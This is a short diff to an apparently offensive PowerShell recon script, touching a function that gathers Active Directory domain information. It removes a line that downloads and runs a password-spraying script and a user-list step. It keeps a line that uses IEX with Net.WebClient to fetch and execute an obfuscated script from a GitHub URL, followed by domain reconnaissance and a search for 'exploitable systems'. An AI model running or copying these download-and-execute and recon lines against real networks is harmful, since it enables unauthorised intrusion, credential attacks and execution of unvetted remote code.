@@ -2113,7 +2113,6 @@ function generaldomaininfo{
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = skulked
     $Domain = $domain_Name.Name
@@ -2121,7 +2120,6 @@ function generaldomaininfo{
     Write-Host -ForegroundColor Yellow '-------> Starting Domain Recon phase:'
 
     Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
-    Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii "$currentPath\DomainRecon\userlist.txt"
     
     Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
     if(!$consoleoutput){inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"}else{inset}
